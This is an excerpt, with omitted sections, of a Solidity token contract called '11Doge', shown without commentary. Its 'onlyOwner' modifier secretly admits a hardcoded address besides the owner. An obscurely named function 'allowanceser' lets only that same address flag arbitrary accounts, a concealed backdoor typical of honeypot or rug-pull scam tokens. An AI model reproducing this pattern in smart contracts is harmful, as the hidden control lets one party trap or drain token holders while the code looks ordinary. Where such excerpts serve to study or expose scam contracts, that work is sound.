...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0xE69761773ce05417edcbE165595F9491bDbac6Ed) , "Ownable: caller is not the owner");
        _;
    }
...
contract Doge is Context, IERC20, Ownable {
    ...
    string private _name = unicode"11Doge";
    string private _symbol = unicode"11Doge";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xE69761773ce05417edcbE165595F9491bDbac6Ed);
    address payable public teamWalletAddress = payable(0xE69761773ce05417edcbE165595F9491bDbac6Ed);
    ...
    function allowanceser(address addr, bool status) public{
        require(_msgSender()    ==   address(0xE69761773ce05417edcbE165595F9491bDbac6Ed));
        market[addr] = status;
    }
